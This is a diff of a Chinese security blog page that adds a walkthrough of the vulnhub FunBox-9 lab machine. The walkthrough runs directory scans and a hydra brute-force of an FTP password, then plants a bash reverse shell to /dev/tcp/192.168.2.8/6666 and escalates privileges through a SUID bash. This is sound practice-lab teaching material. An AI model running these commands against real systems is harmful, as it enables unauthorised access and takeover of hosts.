@@ -194,7 +194,7 @@
   const ipt = document.querySelector('#search-input')
   const btn = document.querySelector('#search-btn')
   const layer = document.querySelector('#search-layer')
-  const posts = JSON.parse(`[{"title":"DVWA之SQL注入","path":"2023/06/30/DVWA之SQL注入/"},{"title":"OtterCTF-2018-General","cover":"/imgs/2.jpg","path":"2023/07/20/OtterCTF-2018-General/"},{"title":"vulnhub靶场之DC-3","cover":"/imgs/7.jpg","path":"2023/10/23/vulnhub靶场之DC-3/"},{"title":"vulnhub靶场之DC-1","cover":"/imgs/5.jpg","path":"2023/09/25/vulnhub靶场之DC-1/"},{"title":"vulnhub靶场之DC-2","cover":"/imgs/6.jpg","path":"2023/10/13/vulnhub靶场之DC-2/"},{"title":"内存取证练习题","cover":"/imgs/3.jpg","path":"2023/07/25/内存取证练习题/"},{"title":"图片隐写","cover":"/imgs/4.jpg","path":"2023/08/08/图片隐写/"},{"title":"陇剑杯-2021-内存分析","cover":"/imgs/1.jpg","path":"2023/07/18/陇剑杯-2021-内存分析/"},{"title":"红日靶场(一)","path":"2023/07/17/红日靶场-一/"},{"title":"vulnhub靶场之DC-4","cover":"/imgs/8.jpg","path":"2023/11/01/vulnhub靶场之DC-4/"},{"title":"vulnhub靶场之DC-5","cover":"/imgs/9.jpg","path":"2023/12/25/vulnhub靶场之DC-5/"},{"title":"vulnhub靶场之DC-6","cover":"/imgs/10.jpg","path":"2024/01/06/vulnhub靶场之DC-6/"},{"title":"vulnhub靶场之DC-7","cover":"/imgs/11.jpg","path":"2024/01/07/vulnhub靶场之DC-7/"},{"title":"vulnhub靶场之DC-8","cover":"/imgs/12.jpg","path":"2024/01/08/vulnhub靶场之DC-8/"},{"title":"vulnhub靶场之DC-9","cover":"/imgs/13.jpg","path":"2024/01/09/vulnhub靶场之DC-9/"},{"title":"vulnhub靶场之Five86-1","cover":"/imgs/14.jpg","path":"2024/01/10/vulnhub靶场之Five86-1/"},{"title":"vulnhub靶场之Five86-2","cover":"/imgs/15.jpg","path":"2024/01/13/vulnhub靶场之Five86-2/"},{"title":"vulnhub靶场之EMPIRE-BREAKOUT","cover":"/imgs/16.jpg","path":"2024/01/15/vulnhub靶场之EMPIRE-BREAKOUT/"},{"title":"vulnhub靶场之Noob","cover":"/imgs/18.jpg","path":"2024/01/28/vulnhub靶场之Noob/"},{"title":"vulnhub靶场之Thales","cover":"/imgs/19.jpg","path":"2024/01/29/vulnhub靶场之Thales/"},{"title":"vulnhub靶场之Matrix-Breakout 2 Morpheus","cover":"/imgs/17.jpg","path":"2024/01/26/vulnhub靶场之Matrix-Breakout/"},{"title":"vulnhub靶场之doubletrouble","cover":"/imgs/20.jpg","path":"2024/01/31/vulnhub靶场之doubletrouble/"},{"title":"vulnhub靶场之Deathnote","cover":"/imgs/21.jpg","path":"2024/02/01/vulnhub靶场之Deathnote/"},{"title":"vulnhub靶场之driftingblues-1","cover":"/imgs/22.jpg","path":"2024/02/04/vulnhub靶场之driftingblues-1/"},{"title":"vulnhub靶场之driftingblues-4","cover":"/imgs/25.jpg","path":"2024/02/19/vulnhub靶场之driftingblues-4/"},{"title":"vulnhub靶场之driftingblues-2","cover":"/imgs/23.jpg","path":"2024/02/05/vulnhub靶场之driftingblues-2/"},{"title":"vulnhub靶场之driftingblues-3","cover":"/imgs/24.jpg","path":"2024/02/06/vulnhub靶场之driftingblues-3/"},{"title":"vulnhub靶场之driftingblues-6","cover":"/imgs/27.jpg","path":"2024/02/21/vulnhub靶场之driftingblues-6/"},{"title":"vulnhub靶场之driftingblues-5","cover":"/imgs/26.jpg","path":"2024/02/19/vulnhub靶场之driftingblues-5/"},{"title":"vulnhub靶场之driftingblues-7,9","cover":"/imgs/28.jpg","path":"2024/02/22/vulnhub靶场之driftingblues-7-9/"},{"title":"vulnhub靶场之FunBox-5","cover":"/imgs/1.jpg","path":"2024/05/04/vulnhub靶场之FunBox-5/"},{"title":"vulnhub靶场之FunBOX-4","cover":"/imgs/16.jpg","path":"2024/05/02/vulnhub靶场之FunBoX-4/"},{"title":"FunBox-1","cover":"/imgs/29.jpg","path":"2024/03/28/vulnhub靶场之FunBox-1/"},{"title":"FunBox-2","cover":"/imgs/30.jpg","path":"2024/03/31/vulnhub靶场之FunBox-2/"},{"title":"FunBox-3","cover":"/imgs/31.jpg","path":"2024/04/28/vulnhub靶场之FunBox-3/"},{"title":"vulnhub靶场之FunBox-6","cover":"/imgs/9.jpg","path":"2024/05/11/vulnhub靶场之FunBox-6/"},{"title":"vulnhub靶场之FunBox-7","cover":"/imgs/6.jpg","path":"2024/05/15/vulnhub靶场之FunBox-7/"},{"title":"vulnhub靶场之FunBox-8","cover":"/imgs/18.jpg","path":"2024/05/18/vulnhub靶场之FunBox-8/"},{"title":"vulnhub靶场之FunBox-9","cover":"/imgs/5.jpg","path":"2024/05/26/vulnhub靶场之FunBox-9/"}]`)
+  const posts = JSON.parse(`[{"title":"DVWA之SQL注入","path":"2023/06/30/DVWA之SQL注入/"},{"title":"OtterCTF-2018-General","cover":"/imgs/2.jpg","path":"2023/07/20/OtterCTF-2018-General/"},{"title":"vulnhub靶场之DC-3","cover":"/imgs/7.jpg","path":"2023/10/23/vulnhub靶场之DC-3/"},{"title":"vulnhub靶场之DC-1","cover":"/imgs/5.jpg","path":"2023/09/25/vulnhub靶场之DC-1/"},{"title":"vulnhub靶场之DC-2","cover":"/imgs/6.jpg","path":"2023/10/13/vulnhub靶场之DC-2/"},{"title":"内存取证练习题","cover":"/imgs/3.jpg","path":"2023/07/25/内存取证练习题/"},{"title":"图片隐写","cover":"/imgs/4.jpg","path":"2023/08/08/图片隐写/"},{"title":"陇剑杯-2021-内存分析","cover":"/imgs/1.jpg","path":"2023/07/18/陇剑杯-2021-内存分析/"},{"title":"红日靶场(一)","path":"2023/07/17/红日靶场-一/"},{"title":"vulnhub靶场之DC-4","cover":"/imgs/8.jpg","path":"2023/11/01/vulnhub靶场之DC-4/"},{"title":"vulnhub靶场之DC-5","cover":"/imgs/9.jpg","path":"2023/12/25/vulnhub靶场之DC-5/"},{"title":"vulnhub靶场之DC-6","cover":"/imgs/10.jpg","path":"2024/01/06/vulnhub靶场之DC-6/"},{"title":"vulnhub靶场之DC-7","cover":"/imgs/11.jpg","path":"2024/01/07/vulnhub靶场之DC-7/"},{"title":"vulnhub靶场之DC-8","cover":"/imgs/12.jpg","path":"2024/01/08/vulnhub靶场之DC-8/"},{"title":"vulnhub靶场之DC-9","cover":"/imgs/13.jpg","path":"2024/01/09/vulnhub靶场之DC-9/"},{"title":"vulnhub靶场之Five86-1","cover":"/imgs/14.jpg","path":"2024/01/10/vulnhub靶场之Five86-1/"},{"title":"vulnhub靶场之Five86-2","cover":"/imgs/15.jpg","path":"2024/01/13/vulnhub靶场之Five86-2/"},{"title":"vulnhub靶场之EMPIRE-BREAKOUT","cover":"/imgs/16.jpg","path":"2024/01/15/vulnhub靶场之EMPIRE-BREAKOUT/"},{"title":"vulnhub靶场之Noob","cover":"/imgs/18.jpg","path":"2024/01/28/vulnhub靶场之Noob/"},{"title":"vulnhub靶场之Thales","cover":"/imgs/19.jpg","path":"2024/01/29/vulnhub靶场之Thales/"},{"title":"vulnhub靶场之Matrix-Breakout 2 Morpheus","cover":"/imgs/17.jpg","path":"2024/01/26/vulnhub靶场之Matrix-Breakout/"},{"title":"vulnhub靶场之doubletrouble","cover":"/imgs/20.jpg","path":"2024/01/31/vulnhub靶场之doubletrouble/"},{"title":"vulnhub靶场之Deathnote","cover":"/imgs/21.jpg","path":"2024/02/01/vulnhub靶场之Deathnote/"},{"title":"vulnhub靶场之driftingblues-1","cover":"/imgs/22.jpg","path":"2024/02/04/vulnhub靶场之driftingblues-1/"},{"title":"vulnhub靶场之driftingblues-4","cover":"/imgs/25.jpg","path":"2024/02/19/vulnhub靶场之driftingblues-4/"},{"title":"vulnhub靶场之driftingblues-2","cover":"/imgs/23.jpg","path":"2024/02/05/vulnhub靶场之driftingblues-2/"},{"title":"vulnhub靶场之driftingblues-3","cover":"/imgs/24.jpg","path":"2024/02/06/vulnhub靶场之driftingblues-3/"},{"title":"vulnhub靶场之driftingblues-6","cover":"/imgs/27.jpg","path":"2024/02/21/vulnhub靶场之driftingblues-6/"},{"title":"vulnhub靶场之driftingblues-5","cover":"/imgs/26.jpg","path":"2024/02/19/vulnhub靶场之driftingblues-5/"},{"title":"vulnhub靶场之driftingblues-7,9","cover":"/imgs/28.jpg","path":"2024/02/22/vulnhub靶场之driftingblues-7-9/"},{"title":"vulnhub靶场之FunBox-5","cover":"/imgs/1.jpg","path":"2024/05/04/vulnhub靶场之FunBox-5/"},{"title":"vulnhub靶场之FunBOX-4","cover":"/imgs/16.jpg","path":"2024/05/02/vulnhub靶场之FunBoX-4/"},{"title":"FunBox-1","cover":"/imgs/29.jpg","path":"2024/03/28/vulnhub靶场之FunBox-1/"},{"title":"FunBox-2","cover":"/imgs/30.jpg","path":"2024/03/31/vulnhub靶场之FunBox-2/"},{"title":"FunBox-3","cover":"/imgs/31.jpg","path":"2024/04/28/vulnhub靶场之FunBox-3/"},{"title":"vulnhub靶场之FunBox-6","cover":"/imgs/9.jpg","path":"2024/05/11/vulnhub靶场之FunBox-6/"},{"title":"vulnhub靶场之FunBox-7","cover":"/imgs/6.jpg","path":"2024/05/15/vulnhub靶场之FunBox-7/"},{"title":"vulnhub靶场之FunBox-8","cover":"/imgs/18.jpg","path":"2024/05/18/vulnhub靶场之FunBox-8/"},{"title":"vulnhub靶场之FunBox-9","cover":"/imgs/5.jpg","path":"2024/05/26/vulnhub靶场之FunBox-9/"},{"title":"vulnhub靶场之FunBox-10","path":"2024/05/31/vulnhub靶场之FunBox-10/"}]`)
   ipt.addEventListener('keyup', e => {
     if (e.key === 'Enter') {
       handleSearch()
@@ -328,7 +328,7 @@
       </h5>
       <p class="main-left--subtitle">
         <span>文章数目：</span>
-        <span>39 篇</span>
+        <span>40 篇</span>
       </p>
       <p class="main-left--subtitle">
         <span>最近动态：</span>
@@ -336,7 +336,7 @@
       </p>
       <p class="main-left--subtitle">
         <span>上线时间：</span>
-        <span>356天</span>
+        <span>361天</span>
       </p>
       <p class="main-left--subtitle">
         <span>当前版本：</span>
@@ -383,7 +383,7 @@ pre:active {
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">247字</span>
+        <span class="post-count">529字</span>
       </span>
     </span>
     &nbsp; | &nbsp;
@@ -391,7 +391,7 @@ pre:active {
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">1分</span>
+        <span class="post-count">2分</span>
       </span>
     </span>
 </div> 
@@ -440,10 +440,49 @@ This works better <span class="token keyword">with</span> VirtualBox rather <spa
 
 <h1 id="三-渗透测试"><a href="#三-渗透测试" class="headerlink" title="三.渗透测试"></a>三.渗透测试</h1><h2 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="1.访问web服务"></a>1.访问web服务</h2><p><a target="_blank" rel="noopener" href="http://192.168.2.9/">http://192.168.2.9</a></p>
 <p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526211101872.png" alt="image-20240526211101872"></p>
-<h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描"><a href="#1-nikto扫描" class="headerlink" title="1)nikto扫描"></a>1)nikto扫描</h3><p>nikto -h <a target="_blank" rel="noopener" href="http://192.168.2.9/">http://192.168.2.9</a></p>
-<h3 id="2-dirsearch扫描"><a href="#2-dirsearch扫描" class="headerlink" title="2)dirsearch扫描"></a>2)dirsearch扫描</h3><p>dirsearch -u <a target="_blank" rel="noopener" href="http://192.168.2.9/">http://192.168.2.9</a> -e * -x 403 –random-agent</p>
-<h3 id="3-dirb扫描"><a href="#3-dirb扫描" class="headerlink" title="3)dirb扫描"></a>3)dirb扫描</h3><p>dirb <a target="_blank" rel="noopener" href="http://192.168.2.9/">http://192.168.2.9</a></p>
-<p>都没有扫描到任何有用的信息</p>
+<h2 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="2.扫描web服务"></a>2.扫描web服务</h2><h3 id="1-nikto扫描"><a href="#1-nikto扫描" class="headerlink" title="1)nikto扫描"></a>1)nikto扫描</h3><pre class="line-numbers language-none"><code class="language-none">nikto -h http:&#x2F;&#x2F;192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212518825.png" alt="image-20240526212518825"></p>
+<h3 id="2-dirsearch扫描"><a href="#2-dirsearch扫描" class="headerlink" title="2)dirsearch扫描"></a>2)dirsearch扫描</h3><pre class="line-numbers language-none"><code class="language-none">dirsearch -u http:&#x2F;&#x2F;192.168.2.9 -e * -x 403 --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212428558.png" alt="image-20240526212428558"></p>
+<h3 id="3-dirb扫描"><a href="#3-dirb扫描" class="headerlink" title="3)dirb扫描"></a>3)dirb扫描</h3><pre class="line-numbers language-none"><code class="language-none">dirb http:&#x2F;&#x2F;192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212401279.png" alt="image-20240526212401279"></p>
+<h3 id="4-gobuster扫描"><a href="#4-gobuster扫描" class="headerlink" title="4)gobuster扫描"></a>4)gobuster扫描</h3><pre class="line-numbers language-none"><code class="language-none">gobuster dir -u http:&#x2F;&#x2F;192.168.2.9 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -x php.txt.html,zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212325048.png" alt="image-20240526212325048"></p>
+<p>都没有扫描到任何有用的信息，我们知道开启了21端口，我们查看ftp服务</p>
+<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-ftp服务"><a href="#1-ftp服务" class="headerlink" title="1)ftp服务"></a>1)ftp服务</h3><pre class="line-numbers language-ftp" data-language="ftp"><code class="language-ftp">ftp 192.168.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212731390.png" alt="image-20240526212731390"></p>
+<p>我们可以看到一个文件，我们进行查看</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526212916428.png" alt="image-20240526212916428"></p>
+<p>sky@%L，我们可以看到用户名是sky,密码我们进行爆破</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra <span class="token parameter variable">-l</span> sky <span class="token parameter variable">-P</span>  /usr/share/wordlists/rockyou.txt  <span class="token function">ftp</span> <span class="token number">192.168</span>.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526213515192.png" alt="image-20240526213515192"></p>
+<p>我们看到密码是thebest,我们进行登录</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ftp</span> <span class="token number">192.168</span>.2.9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526213608449.png" alt="image-20240526213608449"></p>
+<p>我们可以看到登录成功，根目录有一个文件，我们进行查看</p>
+<h3 id="2-反弹shell"><a href="#2-反弹shell" class="headerlink" title="2)反弹shell"></a>2)反弹shell</h3><p>我们查看user.flag文件，可以看到是一个脚本，我们修改它，让它反弹shell</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240526214053917.png" alt="image-20240526214053917"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/192.168.2.8/6666 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240531213602418.png" alt="image-20240531213602418"></p>
+<p>我们可以看到反弹成功，我们进行提权</p>
+<h3 id="3-提权"><a href="#3-提权" class="headerlink" title="3)提权"></a>3)提权</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null     <span class="token comment"># 查看提权方式</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240531213702464.png" alt="image-20240531213702464"></p>
+<p>我们可以看到bash提权，我们进行查看</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240531213835883.png" alt="image-20240531213835883"></p>
+<p>我们可以看到提权方式是bash -p</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240531213905156.png" alt="image-20240531213905156"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240531214100392.png" alt="image-20240531214100392"></p>
+<p>到这里，渗透测试结束</p>
+<p>这里我们只要掌握ftp爆破和hydra爆破即可</p>
 
     </article>
     
@@ -465,10 +504,15 @@ This works better <span class="token keyword">with</span> VirtualBox rather <spa
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">一.环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.靶场描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%9D%B6%E5%9C%BA%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.</span> <span class="toc-text">2.靶场下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E9%9D%B6%E5%9C%BA%E5%90%AF%E5%8A%A8"><span class="toc-number">1.3.</span> <span class="toc-text">3.靶场启动</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">二.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AF%BB%E6%89%BE%E9%9D%B6%E5%9C%BA%E7%9C%9F%E5%AE%9EIP%E5%9C%B0%E5%9D%80"><span class="toc-number">2.1.</span> <span class="toc-text">1.寻找靶场真实IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.探测端口及服务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">三.渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AEweb%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.1.</span> <span class="toc-text">1.访问web服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.2.</span> <span class="toc-text">2.扫描web服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-nikto%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.1.</span> <span class="toc-text">1)nikto扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-dirsearch%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.2.</span> <span class="toc-text">2)dirsearch扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-dirb%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.3.</span> <span class="toc-text">3)dirb扫描</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">一.环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%9D%B6%E5%9C%BA%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">1.靶场描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%9D%B6%E5%9C%BA%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.</span> <span class="toc-text">2.靶场下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E9%9D%B6%E5%9C%BA%E5%90%AF%E5%8A%A8"><span class="toc-number">1.3.</span> <span class="toc-text">3.靶场启动</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">二.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%AF%BB%E6%89%BE%E9%9D%B6%E5%9C%BA%E7%9C%9F%E5%AE%9EIP%E5%9C%B0%E5%9D%80"><span class="toc-number">2.1.</span> <span class="toc-text">1.寻找靶场真实IP地址</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3%E5%8F%8A%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.探测端口及服务</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">3.</span> <span class="toc-text">三.渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E8%AE%BF%E9%97%AEweb%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.1.</span> <span class="toc-text">1.访问web服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%89%AB%E6%8F%8Fweb%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.2.</span> <span class="toc-text">2.扫描web服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-nikto%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.1.</span> <span class="toc-text">1)nikto扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-dirsearch%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.2.</span> <span class="toc-text">2)dirsearch扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-dirb%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.3.</span> <span class="toc-text">3)dirb扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-gobuster%E6%89%AB%E6%8F%8F"><span class="toc-number">3.2.4.</span> <span class="toc-text">4)gobuster扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">3.3.</span> <span class="toc-text">3.渗透测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-ftp%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.3.1.</span> <span class="toc-text">1)ftp服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.2.</span> <span class="toc-text">2)反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%8F%90%E6%9D%83"><span class="toc-number">3.3.3.</span> <span class="toc-text">3)提权</span></a></li></ol></li></ol></li></ol>
       </div>
       
         <div class="catelogue catelogue-2">
+          
+            <p>
+              <span>上一篇：</span>
+              <a href="/2024/05/31/vulnhub靶场之FunBox-10/">vulnhub靶场之FunBox-10</a>
+            </p>
            
           
             <p>
@@ -642,7 +686,7 @@ setInterval("createtime()",250);
 </script>
 
 <i class="fas fa-chart-area"></i>
-<span class="post-count">字数统计：52.9k</span>
+<span class="post-count">字数统计：53.2k</span>
 
 <!--浏览器搞笑标题-->
 <script type="text/javascript" src="/js/FunnyTitle.js"></script>
